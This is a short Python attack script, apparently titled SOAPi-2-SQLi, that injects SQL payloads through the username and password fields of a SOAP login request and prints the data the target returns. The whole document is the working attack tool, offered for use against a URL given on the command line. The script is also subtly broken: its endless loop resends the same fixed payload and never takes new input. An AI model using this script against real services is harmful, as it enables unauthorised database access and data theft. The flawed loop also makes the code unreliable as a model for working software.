SOAPi-2-SQLi.py

import sys
import requests
import xml.etree.ElementTree as ET

def execute_command(url, username, password):
    while True:
        payload = f'''<?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
            <soap:Body>
                <LoginRequest xmlns="http://tempuri.org/">
                    <username>{username}</username>
                    <password>{password}</password>
                </LoginRequest>
            </soap:Body>
        </soap:Envelope>'''
        
        response = requests.post(url, data=payload, headers={"SOAPAction": '"Login"'})
        response_content = response.content.decode('utf-8')
        
        try:
            root = ET.fromstring(response_content)
            
            namespaces = {
                'soap': 'http://schemas.xmlsoap.org/soap/envelope/',
                'tns': 'http://tempuri.org/'
            }
            
            result_element = root.find('.//{http://tempuri.org/}result')
            
            if result_element is not None:
                result_text = result_element.text.strip()
                print(result_text)
            else:
                print("Invalid SQLi Payload")
                sys.exit()
        except AttributeError:
            print("Invalid SQLi Payload")
            sys.exit()
        except Exception as e:
            print("An error occurred:", e)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python script.py <URL> <username> <password>")
        sys.exit(1)
    
    url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    execute_command(url, username, password)
